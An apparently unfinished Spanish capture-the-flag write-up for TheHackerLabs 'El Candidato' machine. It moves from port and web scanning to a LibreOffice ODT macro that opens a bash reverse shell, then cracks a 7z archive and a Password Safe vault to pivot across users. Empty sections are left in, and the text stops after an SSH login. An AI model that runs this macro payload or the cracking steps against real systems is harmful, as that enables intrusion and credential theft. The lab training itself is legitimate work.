---
layout: single
title: El Candidato - TheHackerLabs
excerpt: "."
date: 2025-10-01
classes: wide
header:
  teaser: /assets/images/THL-writeup-elCandidato/_logo.png
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Medium Machine
tags:
  - Linux
  - 
  - 
  - OSCP Style
---
![](/assets/images/THL-writeup-elCandidato/_logo.png)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.150
PING 192.168.100.150 (192.168.100.150) 56(84) bytes of data.
64 bytes from 192.168.100.150: icmp_seq=1 ttl=64 time=13.1 ms
64 bytes from 192.168.100.150: icmp_seq=2 ttl=64 time=0.903 ms
64 bytes from 192.168.100.150: icmp_seq=3 ttl=64 time=0.870 ms
64 bytes from 192.168.100.150: icmp_seq=4 ttl=64 time=1.15 ms

--- 192.168.100.150 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3013ms
rtt min/avg/max/mdev = 0.870/4.007/13.106/5.254 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

<br>

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.150 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 20:42 CST
Initiating ARP Ping Scan at 20:42
Scanning 192.168.100.150 [1 port]
Completed ARP Ping Scan at 20:42, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:42
Scanning 192.168.100.150 [65535 ports]
Discovered open port 110/tcp on 192.168.100.150
Discovered open port 22/tcp on 192.168.100.150
Discovered open port 995/tcp on 192.168.100.150
Discovered open port 445/tcp on 192.168.100.150
Discovered open port 80/tcp on 192.168.100.150
Discovered open port 139/tcp on 192.168.100.150
Discovered open port 143/tcp on 192.168.100.150
Discovered open port 25/tcp on 192.168.100.150
Discovered open port 993/tcp on 192.168.100.150
Completed SYN Stealth Scan at 20:42, 6.43s elapsed (65535 total ports)
Nmap scan report for 192.168.100.150
Host is up, received arp-response (0.0016s latency).
Scanned at 2025-10-01 20:42:49 CST for 7s
Not shown: 65526 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
25/tcp  open  smtp         syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
110/tcp open  pop3         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
143/tcp open  imap         syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
993/tcp open  imaps        syn-ack ttl 64
995/tcp open  pop3s        syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

<br>

Hay bastantes puertos abiertos, y me da curiosidad ver no solo el **servicio Samba**, sino ver el **protocolo SMTP, pop3, imap, imaps y pop3s**. 

Esto me da a entender que se estan ocupando mucho correos electronicos.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 22,25,80,110,139,143,445,993,995 192.168.100.150 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 20:43 CST
Nmap scan report for 192.168.100.150
Host is up (0.0011s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 f5:83:ee:35:33:dc:c8:64:67:e5:1e:3d:37:ac:44:6e (ECDSA)
|_  256 49:84:2d:38:2b:f1:39:92:bc:13:7c:17:2a:ae:e8:a1 (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: gyhabogados.thl, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp  open  http        Apache httpd 2.4.62 ((Debian))
|_http-title: Gonz\xC3\xA1lez, Herrera y C\xC3\xADa. Abogados
|_http-server-header: Apache/2.4.62 (Debian)
110/tcp open  pop3        Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=LawHacked.lawhacked.thl
| Subject Alternative Name: DNS:LawHacked.lawhacked.thl
| Not valid before: 2024-12-05T16:19:15
|_Not valid after:  2034-12-03T16:19:15
|_pop3-capabilities: UIDL SASL(PLAIN LOGIN) STLS PIPELINING CAPA RESP-CODES TOP AUTH-RESP-CODE USER
139/tcp open  netbios-ssn Samba smbd 4
143/tcp open  imap        Dovecot imapd
| ssl-cert: Subject: commonName=LawHacked.lawhacked.thl
| Subject Alternative Name: DNS:LawHacked.lawhacked.thl
| Not valid before: 2024-12-05T16:19:15
|_Not valid after:  2034-12-03T16:19:15
|_imap-capabilities: SASL-IR OK capabilities LITERAL+ post-login LOGIN-REFERRALS AUTH=PLAIN have more listed ENABLE IMAP4rev1 Pre-login AUTH=LOGINA0001 STARTTLS ID IDLE
|_ssl-date: TLS randomness does not represent time
445/tcp open  netbios-ssn Samba smbd 4
993/tcp open  ssl/imap    Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=LawHacked.lawhacked.thl
| Subject Alternative Name: DNS:LawHacked.lawhacked.thl
| Not valid before: 2024-12-05T16:19:15
|_Not valid after:  2034-12-03T16:19:15
|_imap-capabilities: SASL-IR OK capabilities more LITERAL+ AUTH=PLAIN have post-login listed ENABLE IMAP4rev1 LOGIN-REFERRALS AUTH=LOGINA0001 Pre-login ID IDLE
995/tcp open  ssl/pop3    Dovecot pop3d
| ssl-cert: Subject: commonName=LawHacked.lawhacked.thl
| Subject Alternative Name: DNS:LawHacked.lawhacked.thl
| Not valid before: 2024-12-05T16:19:15
|_Not valid after:  2034-12-03T16:19:15
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: UIDL CAPA AUTH-RESP-CODE USER SASL(PLAIN LOGIN) TOP RESP-CODES PIPELINING
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-10-02T02:44:01
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.22 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

<br>

Observa que el **protocolo SMTP** nos esta dando un dominio llamado **gyhabogados.thl**.

Vamos a registrarlo en el `/etc/hosts`:
```bash
echo "192.168.100.150 gyhabogados.thl" >> /etc/hosts
```

Ahora, el **servicio Samba** parece necesitar credenciales válidas para poder ver los archivos compartidos, por lo que de momento, no es una opción para empezar.

Entonces, empecemos por la página web, visitando el dominio.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura1.png">
</p>

Parece ser una página de abogados.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura2.png">
</p>

Hay algunas tecnologías, pero no veo algo que nos ayude.

Bajando un poco y aplicando **Hoovering**, veremos una página que solamente muestra la historia del bufet de abogados:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura3.png">
</p>

De igual forma, podemos ver esa página y otra en el menu que aparece en la esquina superior derecha:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura4.png">
</p>

Y el más interesante, es la página **TRABAJA CON NOSOTROS** porque al bajar, la página nos permite subir 3 tipos de archivos, siendo PDF, DOC y ODT:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura5.png">
</p>

Quizá podamos explotar esta subida de archivos para subir una **Reverse Shell**, pero primero apliquemos **Fuzzing** por si hay algo oculto por ahí.

<br>

<h2 id="fuzz">Fuzzing</h2>

Primero, usaremos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://gyhabogados.thl/FUZZ -t 300 -e .php,.txt,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://gyhabogados.thl/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 7760, Words: 653, Lines: 166, Duration: 163ms]
images                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 124ms]
uploads                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 7ms]
README.txt              [Status: 200, Size: 1344, Words: 173, Lines: 45, Duration: 5ms]
config                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 11ms]
views                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 59ms]
LICENSE.txt             [Status: 200, Size: 17128, Words: 2798, Lines: 64, Duration: 39ms]
assets                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 9971ms]
.html                   [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 53ms]
                        [Status: 200, Size: 7760, Words: 653, Lines: 166, Duration: 58ms]
.php                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 59ms]
roundcube               [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 36ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 50ms]
:: Progress: [882180/882180] :: Job [1/1] :: 274 req/sec :: Duration: [0:05:19] :: Errors: 0 ::
```

| Parámetros | Descripción |
|--------------------------|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*       | Para indicar una busqueda de archivos específicos. |

<br>

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://gyhabogados.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -x php,txt,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gyhabogados.thl
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://gyhabogados.thl/images/]
/uploads              (Status: 301) [Size: 320] [--> http://gyhabogados.thl/uploads/]
/assets               (Status: 301) [Size: 319] [--> http://gyhabogados.thl/assets/]
/index.php            (Status: 200) [Size: 7760]
/README.txt           (Status: 200) [Size: 1344]
/config               (Status: 301) [Size: 319] [--> http://gyhabogados.thl/config/]
/views                (Status: 301) [Size: 318] [--> http://gyhabogados.thl/views/]
/LICENSE.txt          (Status: 200) [Size: 17128]
/roundcube            (Status: 301) [Size: 322] [--> http://gyhabogados.thl/roundcube/]
/server-status        (Status: 403) [Size: 280]
Progress: 882176 / 882176 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|--------------------------|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar una busqueda de archivos específicos. |

<br>

Hay varios directorios, uno que llama la atención es el de `/uploads`, pues supongamos que es ahí donde se suben los archivos:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura6.png">
</p>

Pero observa que no tenemos permisos para ver su contenido.

Otro directorio interesante es el `/roundcubes`, que al visitarlo nos manda a un login:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura7.png">
</p>

Para ganar acceso a este login, necesitaremos un correo y contraseña válidos.

Investiguemos que es eso de **Roundcubes**:

| **Roundcube** |
|:-------------:|
| *Roundcube es un cliente de correo web (webmail) escrito en PHP, que se instala en un servidor y permite a los usuarios acceder a su correo electrónico desde un navegador. Cuenta con soporte para protocolos estándar como SMTP e IMAP, una interfaz tipo webmail similar a Gmail, Outlook Web Access o Horde, etc.* |

<br>

Busquemos una forma de abusar de la subida de archivos, para poder cargar una **Reverse Shell**.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="RevShell">Aplicando Arbitrary File Upload para Cargar Reverse Shell y Ganar Acceso a la Máquina Víctima</h2>

De acuerdo a los archivos que podemos subir, la mejor opción son los archivos tipo **ODT**:

| **Archivo ODT** |
|:---------------:|
| *Un ODT es un tipo de archivo de texto creado con la extensión .odt, que corresponde a OpenDocument Text. es el equivalente “abierto” a un archivo de Word (.doc o .docx), pero usado principalmente por LibreOffice Writer, Apache OpenOffice Writer y otros programas compatibles con el estándar OpenDocument Format (ODF).* |

<br>

Esta clase de archivos sirve en **Windows y Linux**, por lo que es una buena opción porque estamos contra una máquina **Linux**.

Podemos seguir las instrucciones del siguiente blog para crear un **archivo ODT** malicioso, que contendra una **Reverse Shell**:
* <a href="https://medium.com/@akshay__0/initial-access-via-malicious-odt-macro-ac7f5d15796d" target="_blank">Initial Access via Malicious ODT Macro</a>

La idea del blog, es agregar una **Macro** al **archivo ODT** que ejecute una **Reverse Shell** cuando sea enviada y recibida por la página web.

Vamos a hacerlo por pasos:

* Crea un archivo random con **libreoffice** y guardalo en tu directorio de trabajo:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura8.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura9.png">
</p>

* Para crear una macro, sigue las secciones `Tools > Macros > Organize Macros > Basic...`:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura10.png">
</p>

* Selecciona tu **archivo ODT**, dale clic al **botón New** para crear una nueva **Macro** y dale un nombre a la **Macro**, por ejemplo **RevShell**. Cuando le des al botón **OK**, nos saldrá una nueva ventana que ya nos permite agregar código:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura11.png">
</p>

* En esa nueva ventana, agrega el siguiente código y luego guarda con **CTRL + S** o desde el botón **Guardar** en la esquina superios izquierda:

```bash
shell("bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'")
```

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura12.png">
</p>

* Después de guardar, ve a la página principal de tu archivo y ve a la sección `Tools > Customize`:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura13.png">
</p>

* En la nueva ventana, ve a la sección **Events**, selecciona el evento **Open Document**, revisa que este seleccionada tu **Macro** y dale al botón **Macro**:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura14.png">
</p>

* En la nueva ventana, despliega los elementos de tu archivo, luego selecciona tu **Macro** y dale a **OK**, después vuelve a darle **OK** y nuestro archivo ya estara listo:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura15.png">
</p>

* Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

* Sube el archivo a la página web:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura16.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura17.png">
</p>

* Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.150] 48714
bash: cannot set terminal process group (3964): Inappropriate ioctl for device
bash: no job control in this shell
bash: /home/bob/.bashrc: Permission denied
bob@TheHackersLabs-Gyhabogados:~$ whoami
whoami
bob
```
Estamos dentro.

Solo falta obtener una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```

<br>

<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```



<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id="Crack7z">Crackeando Archivo 7z y Ganando Acceso al Login de Roundcube</h2>

Antes que nada, veamos que usuarios existen en la máquina víctima:
```bash
bob@TheHackersLabs-Gyhabogados:~$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
sam:x:1001:1001::/home/sam:/bin/bash
dean:x:1002:1002:Dean,,,:/home/dean:/bin/bash
john:x:1003:1003:John,,,:/home/john:/bin/bash
```
Tenemos 4 usuarios aparte del **Root**.

Podemos ver sus directorios en el directorio `/home`, de los cuales no tendremos permisos:
```bash
bob@TheHackersLabs-Gyhabogados:~$ ls -la /home
total 24
drwxr-xr-x  6 root root     4096 Dec  7  2024 .
drwxr-xr-x 20 root root     4096 Dec  6  2024 ..
drwx------ 19 bob  bob      4096 Dec  8  2024 bob
drwx------  8 dean abogados 4096 Dec  8  2024 dean
drwx------  8 john john     4096 Dec  8  2024 john
drwx------  6 sam  abogados 4096 Dec  8  2024 sam
```

Revisando los archivos del **usuario bob**, encontraremos un archivo comprimido en **7z**:
```bash
bob@TheHackersLabs-Gyhabogados:~$ ls
credentials.7z  Desktop  Documents  Downloads  mail  Maildir  Music  Pictures  Public  scripts  Templates  Videos
```
Vamos a mandarlo a nuestra máquina.

Inicia un servidor con **Python3** en la máquina víctima:
```bash
bob@TheHackersLabs-Gyhabogados:~$ which python3
/usr/bin/python3
bob@TheHackersLabs-Gyhabogados:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Descarga el archivo comprimido con **wget**:
```bash
wget http://192.168.100.150:8000/credentials.7z
```

Vamos a descomprimirlo:
```bash
7z x credentials.7z

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=es_MX.UTF-8 Threads:6 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 186 bytes (1 KiB)

Extracting archive: credentials.7z
--
Path = credentials.7z
Type = 7z
Physical Size = 186
Headers Size = 154
Method = LZMA2:12 7zAES
Solid = -
Blocks = 1

    
Enter password (will not be echoed):
```
Necesita una contraseña, por lo que tendremos que crackearlo.

Obengamos el hash del archivo comprimido con la herramienta 
```bash
7z2john credentials.7z > hash
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
```

Y lo crackeamos con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 128/128 SSE2 4x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 6 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 26 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
barcelona        (credentials.7z)     
1g 0:00:00:04 DONE (2025-10-02 00:01) 0.2369g/s 68.24p/s 68.24c/s 68.24C/s jackie..brenda
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña.

Ahora sí, lo descomprimimos y nos da un archivo de texto. Leamoslo:
```bash
cat credentials.txt
bob:***********
```
Tenemos la contraseña del **usuario bob**.

Podríamos usar la contraseña para obtener una sesión vía **SSH**, pero podemos seguir usando la sesión actual.

Además, podemos ver que privilegios tiene nuestro usuario:
```bash
bob@TheHackersLabs-Gyhabogados:~$ sudo -l
[sudo] password for bob: 
Sorry, user bob may not run sudo on TheHackersLabs-Gyhabogados.
```
No tiene ninguno.

La contraseña tampoco servira para listar algún archivo compartido del **servicio Samba**:
```bash
crackmapexec smb 192.168.100.150 -u 'bob' -p '**********'
SMB         192.168.100.150 445    THEHACKERSLABS-GYHABOGADOS [*] Windows 6.1 Build 0 (name:THEHACKERSLABS-GYHABOGADOS) (domain:THEHACKERSLABS-GYHABOGADOS) (signing:False) (SMBv1:False)
SMB         192.168.100.150 445    THEHACKERSLABS-GYHABOGADOS [-] THEHACKERSLABS-GYHABOGADOS\bob:********** STATUS_LOGON_FAILURE
```

Pero si usamos el usuario y contraseña en el login de **Roundcube**, ganaremos acceso:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura18.png">
</p>

<br>

<h2 id="Roundcube">Ganando Acceso como Usuario sam y Enumeración del Servicio Samba</h2>

Revisando la sesión de **bob** en **Roundcube**, encontraremos que se le envío un mensaje al **usuario sam**:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura19.png">
</p>

Tenemos la contraseña del **usuario sam**.

Puede que la haya cambiado, pero mejor lo comprobamos:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura20.png">
</p>

No la cambio.

Si la probamos en el **servicio SSH**, también tendremos acceso:
```bash
ssh sam@192.168.100.150
sam@192.168.100.150's password: 
Linux TheHackersLabs-Gyhabogados 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64
...
Last login: Sun Dec  8 18:26:08 2024
sam@TheHackersLabs-Gyhabogados:~$ whoami
sam
```
El problema es que no encontraremos nada que nos ayude por aquí.

Pero si probamos la contraseña del **usuario sam** en el **servicio Samba**,  ya podremos listar los archivos compartidos:
```bash
crackmapexec smb 192.168.100.150 -u 'sam' -p '**********'
SMB         192.168.100.150 445    THEHACKERSLABS-GYHABOGADOS [*] Windows 6.1 Build 0 (name:THEHACKERSLABS-GYHABOGADOS) (domain:THEHACKERSLABS-GYHABOGADOS) (signing:False) (SMBv1:False)
SMB         192.168.100.150 445    THEHACKERSLABS-GYHABOGADOS [+] THEHACKERSLABS-GYHABOGADOS\sam:**********
```

Listemos los archivos compartidos con **smbmap**:
```bash
smbmap -H 192.168.100.150 -u 'sam' -p '**********' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.100.150:445	Name: gyhabogados.thl     	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	CONFIDENCIALES                                    	READ ONLY	Documentos Confidenciales de Clientes
	IT_TOOLS                                          	NO ACCESS	IT Tools
	RESPALDOS_IT                                      	READ ONLY	Respaldos IT
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.17.12-Debian)
	sam                                               	READ ONLY	Home Directories
[*] Closed 1 connections
```

Me llama la atención el directorio **CONDIFENCIALES**, pero me interesa mucho más el directorio **RESPALDOS_IT**, así que veamos su contenido:
```bash
smbmap -H 192.168.100.150 -u 'sam' -p '**********' -r RESPALDOS_IT --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.100.150:445	Name: gyhabogados.thl     	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	CONFIDENCIALES                                    	READ ONLY	Documentos Confidenciales de Clientes
	IT_TOOLS                                          	NO ACCESS	IT Tools
	RESPALDOS_IT                                      	READ ONLY	Respaldos IT
	./RESPALDOS_IT
	dr--r--r--                0 Sun Dec  8 11:56:48 2024	.
	dr--r--r--                0 Sun Dec  8 11:55:59 2024	..
	fr--r--r--              520 Sun Dec  8 11:49:32 2024	credenciales.psafe3
	fr--r--r--              582 Sat Dec  7 19:41:58 2024	IMPORTANTE.txt
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.17.12-Debian)
	sam                                               	READ ONLY	Home Directories
[*] Closed 1 connections
```
Hay dos archivos.

Descarguémoslos:
```bash
smbmap -H 192.168.100.150 -u 'sam' -p '**********' --download RESPALDOS_IT/credenciales.psafe3 --no-banner
smbmap -H 192.168.100.150 -u 'sam' -p '**********' --download RESPALDOS_IT/IMPORTANTE.txt --no-banner
mv 192.168.100.150-RESPALDOS_IT_credenciales.psafe3 credenciales.psafe3
mv 192.168.100.150-RESPALDOS_IT_IMPORTANTE.txt IMPORTANTE.txt
```

<br>

<h2 id="psafe">Crackeando Base de Datos de Password Safe</h2>

Primero leamos ese archivo de texto:
```bash
cat IMPORTANTE.txt
Dean,

He notado que estás reutilizando tus credenciales con frecuencia, lo que puede comprometer la seguridad de la empresa.

Para facilitarte la gestión de contraseñas y mejorar la seguridad, he decidido crear una bóveda de contraseñas para ti, utilizando un gestor de contraseñas.

Con esta herramienta, solo necesitarás recordar una contraseña maestra para acceder a todas tus credenciales de manera segura.

La contraseña maestra es similar a la que te proporcioné en la bienvenida: "ChevyImpala1967". Sin embargo, en lugar de "1967", deberás usar un año diferente.
```
Ya nos dieron una pista de cual puede ser la contraseña del **usuario dean**.

Revisando el otro archivo, resulta ser una base de datos de **Password Safe**:
```bash
file credenciales.psafe3
credenciales.psafe3: Password Safe V3 database
```
Si queremos abrir esa base de datos, necesitaremos una contraseña válida que suponemos es la que menciona el archivo de texto.

Vamos a crear un wordlist que tenga distintos números que sirvan como años dentro de la contraseña, usando la herramienta **crunch**:
```bash
crunch 15 15 0123456789 -t ChevyImpala@@@@ -o passWordlist.txt
Crunch will now generate the following amount of data: 160000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 10000 

crunch: 100% completed generating output
```

Ahora usemos **JohnTheRipper** para crackear la base de datos de **Password Safe**:
```bash
john -w:passWordlist.txt psafe3Hash
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 SSE2 4x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ChevyImpala1995  (credencial)     
1g 0:00:00:00 DONE (2025-10-02 21:48) 5.000g/s 15360p/s 15360c/s 15360C/s ChevyImpala0000..ChevyImpala3071
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña.

Inicia **Password Safe** con el comando **pwsafe** (eso si lo tienes instalado) y dale la contraseña. Una vez dentro, da clic derecho sobre la credencial guardada y para verla, dale clic al simbolo del ojo para poder verla en texto claro:

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura21.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-elCandidato/Captura22.png">
</p>

Tenemos la contraseña del **usuario dean**.

Probémosla:
```bash
ssh dean@192.168.100.150
dean@192.168.100.150's password: 
Linux TheHackersLabs-Gyhabogados 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64
...
Last login: Sun Dec  8 19:12:27 2024
